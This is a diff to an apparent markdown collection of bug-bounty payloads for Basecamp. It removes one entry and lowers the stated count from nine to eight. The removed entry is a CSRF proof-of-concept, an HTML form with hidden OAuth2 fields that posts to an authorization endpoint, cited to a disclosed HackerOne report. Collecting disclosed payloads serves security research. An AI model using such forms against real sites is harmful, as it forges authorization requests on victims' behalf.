@@ -1,21 +1,6 @@
 # Basecamp
 
-9 payloads.
-
-### `c93ed5ae`
-
-```
-<form action="https://target.com/authorization.json" method="POST">
-      <input type="hidden" name="client&#95;id" value="{your-client-id}" />
-      <input type="hidden" name="client&#95;secret" value="" />
-      <input type="hidden" name="type" value="web&#95;server" />
-      <input type="hidden" name="redirect&#95;uri" value="{your-redirect-uri}" />
-      <input type="hidden" name="commit" value="" />
-      <input type="submit" value="Submit request" />
-    </form>
-```
-
-— [CSRF on target.com OAuth2 authorization endpoint](https://hackerone.com/reports/850022) · Basecamp · [carbon61](https://hackerone.com/carbon61)
+8 payloads.
 
 ### `a4ab2c4e`
 
